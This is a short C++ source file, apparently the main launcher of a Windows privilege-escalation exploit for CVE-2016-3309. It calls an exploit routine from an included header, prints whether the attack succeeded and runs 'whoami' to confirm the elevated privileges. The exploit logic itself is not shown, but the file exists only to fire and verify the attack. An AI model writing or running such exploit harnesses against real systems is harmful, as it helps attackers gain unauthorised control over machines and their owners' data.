// exp_x64.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include "CVE-2016-3309.h"

#define VUL_NAME "CVE-2016-3309"

int main()
{
	BOOL bSucc = FALSE;

	if (strcmp(VUL_NAME, "CVE-2016-3309") == 0)
	{
		bSucc = Exploit_CVE_2016_3309();
	}

	if (bSucc)	printf("Exploit %s success\n", VUL_NAME);
	else printf("Exploit %s Fail\n", VUL_NAME);

	system("whoami");
	system("pause");

    return 0;
}

